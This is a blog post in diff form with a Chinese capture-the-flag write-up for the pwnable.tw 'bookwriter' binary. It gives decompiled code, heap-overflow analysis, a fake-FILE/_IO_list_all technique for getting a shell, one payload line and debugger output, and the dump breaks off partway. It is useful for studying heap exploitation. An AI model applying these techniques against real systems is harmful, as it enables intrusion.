@@ -1,0 +1,556 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="writeup" />
+
+
+<link rel="canonical" href="http://example.com/2022/04/10/pwnable-bookwriter/">
+
+
+
+  <title>
+ - pwn |
+dreamcat = 我他喵的</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-04-10 19:09:05">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-04-10T19:09:05+08:00">2022-04-10</time>
+  </span>
+  <span class="item" title="Symbols count in article">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">Symbols count in article</span>
+    <span>11k</span>
+    <span class="text">words</span>
+  </span>
+  <span class="item" title="Reading time">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">Reading time</span>
+    <span>10 mins.</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewkhf1zj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhpw3lwj20zk0m8gvw.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhtuo6nj20zk0m8ttm.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/pwn/" itemprop="item" rel="index" title="In pwn"><span itemprop="name">pwn</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/10/pwnable-bookwriter/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="dreamcat">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="我他喵的">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="pwnabletw"><a class="markdownIt-Anchor" href="#pwnabletw">#</a> <span class="exturl" data-url="aHR0cDovL3B3bmFibGUudHc=">pwnable.tw</span>	bookwriter			ubuntu16,libc 2.23</h1>
+<h2 id="保护"><a class="markdownIt-Anchor" href="#保护">#</a> 保护：</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ checksec --file=bookwriter</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/Desktop/pwnabletw/BookWriter/bookwriter&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<h2 id="主要代码"><a class="markdownIt-Anchor" href="#主要代码">#</a> 主要代码：</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ ./bookwriter </span><br><span class="line">Welcome to the BookWriter !</span><br><span class="line">Author :qqqqqqqqqqq</span><br><span class="line">----------------------</span><br><span class="line">      BookWriter      </span><br><span class="line">----------------------</span><br><span class="line"> <span class="number">1.</span> Add a page        </span><br><span class="line"> <span class="number">2.</span> View a page       </span><br><span class="line"> <span class="number">3.</span> Edit a page       </span><br><span class="line"> <span class="number">4.</span> Information       </span><br><span class="line"> <span class="number">5.</span> Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="main函数"><a class="markdownIt-Anchor" href="#main函数">#</a> main 函数</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the BookWriter !&quot;</span>);</span><br><span class="line">  readname();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( getnum() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        info();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        updatename();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="readname函数"><a class="markdownIt-Anchor" href="#readname函数">#</a> readname 函数</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400BDF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Author :&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> readck(&amp;auther, <span class="number">64LL</span>);</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">readck</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  len = _read_chk(<span class="number">0LL</span>, a1, a2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(len - <span class="number">1LL</span> + a1) == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    *(_BYTE *)(len - <span class="number">1LL</span> + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="menu函数"><a class="markdownIt-Anchor" href="#menu函数">#</a> menu 函数</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;      BookWriter      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Add a page        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. View a page       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Edit a page       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Information       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 5. Exit              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="add函数"><a class="markdownIt-Anchor" href="#add函数">#</a> add 函数</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t add new page anymore!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;ptrlist)[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size of page :&quot;</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  v2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">  readck((__int64)v2, size);</span><br><span class="line">  (&amp;ptrlist)[i] = v2;</span><br><span class="line">  sizelist[i] = size;</span><br><span class="line">  ++count;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="info函数"><a class="markdownIt-Anchor" href="#info函数">#</a> info 函数</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">info</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index of page :&quot;</span>);</span><br><span class="line">  idx = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;out of page:&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;ptrlist)[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not found !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page #%u \n&quot;</span>, idx);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Content :\n%s\n&quot;</span>, (&amp;ptrlist)[idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="edit函数"><a class="markdownIt-Anchor" href="#edit函数">#</a> edit 函数</h3>
+<figure class="highlight v"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> edit()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;Index of page :&quot;</span>);</span><br><span class="line">  v1 = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;out of page:&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;ptrlist)[v1] )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Not found !&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  readck((__int64)(&amp;ptrlist)[v1], sizelist[v1]);</span><br><span class="line">  sizelist[v1] = strlen((&amp;ptrlist)[v1]);        <span class="comment">// 更新size，但是，readck不会加设空结尾，不对齐输入，可以造成溢出1字节</span></span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里虽然会更新 size，但是如果我们读入的 text，刚好填充 chunk 的用户区，但是结尾不是’\x00’，更新长度的时候，会把下一个堆块的 size 算进去。造成溢出，如果是 topchunk_size 溢出会更多</p>
+<h3 id="updatename函数"><a class="markdownIt-Anchor" href="#updatename函数">#</a> updatename 函数</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">updatename</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Author : %s\n&quot;</span>, auther);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page : %u\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)count);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    readnum();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h2>
+<p>程序的一的大漏洞就是对于输入的字符串只会检查换行符，而不会见擦汗输入是否有结束符，输入 name 的时候，党字符串长度为 64 时，就会接上 gptr, 导致堆地址泄露。</p>
+<p>程序没有 free，如何泄露 libc？</p>
+<p>add 时，判断错误，会导致读入第九个在 sizelist 的位置，所以修改 sizelist [0] 的大小为 0，readck 允许读入为 0。导致再次 edit ptrlist [0] 时读入很大数据溢出。修改 topchunk：</p>
+<p>edit 时，对于非对齐输入，会造成溢出，将下一个堆块的 size，计入当前堆块 content 的 size，topchunk 溢出 3 字节，其他堆块溢出 1 字节。通过三字节的溢出将 topchunk 变得很小。</p>
+<p><em>updatename 的时候使用了 scnaf (&quot;% d&quot;)，这有点奇怪，因为 scanf 需要用到堆空间来处理缓存：（这里没有任何利用价值）：</em></p>
+<p>关键还是在于修改 topchunk , 党 topchunk_size 小于申请的空间大小时，会释放 topchunk 进入 unsortedbins, 这样就会造成 libc 及地址的泄露。</p>
+<p>当我们已经申请了 8 个 page，如果 size [0]==0，就可以绕过检查，额外申请出来一个 page，将地址返回写道 size [0]，那么，再次 edit ptrlist [0] 时，就可以实现溢出，（因为地址很大，足够溢出）</p>
+<p>同时，更新 comment 的长度依旧是检查空字符，所以可以使的更新后对应的 size 为 0，导致第九个指针变量为 0，可以继续申请堆块，这个可以重复利用。</p>
+<p>如此，旧的 topchunk 在 unsortedbins 里面，修改其 bk 指针，利用 unsortedbins attack 实现任意地址写大数据（main_arena+88），</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7f7ba0e31540</span> &lt;_IO_2_1_stderr_&gt;</span><br><span class="line"><span class="comment">//payload = b&#x27;/bin/sh\x00&#x27;+p64(0x61)+p64(main_arena)+p64(list_all-0x10)+p64(2)+p64(3)</span></span><br><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7f7ba0e30b78</span> &lt;main_arena+<span class="number">88</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>下面很巧妙的东西来了，我们伪造_IO_list_all 的数据为 main_arena+88, 那么原本_  _chain 指向下一个 file 结构体，结果 fakeFIlede 的 chain 就是 smallbins 的入口马志翔里面的第一个 chunk。所以我们将 unsortedbin 里面的 topchunk 的 size 变小，就会进入 smallbin，然后 fakefile_chain --&gt;topchunk，我们利用溢出将 topchunk 伪造成另一个 fakefile2，并伪造 vtable。伪造 fakefile2 要注意， flag 写入的是‘/bin/sh\x00’ , 因为 vtable 里面的函数大多会以 flag 作为自己的参数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7f7ba0e30b78</span>   &lt;main_arena+<span class="number">88</span>&gt; <span class="comment">//伪造的第一个fakefile</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">17100832</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x102c2c0</span> <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x102c2c0</span> <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7f7ba0e31510</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7f7ba0e30b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;\300\302\002\001&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f7ba0e30b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;\300\302\002\001&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7f7ba0e30b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7f7ba0e30b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7f7ba0e30ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x7f7ba0e30ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230\v\343\240&#123;\177&quot;</span>, </span><br><span class="line">    _IO_backup_base = <span 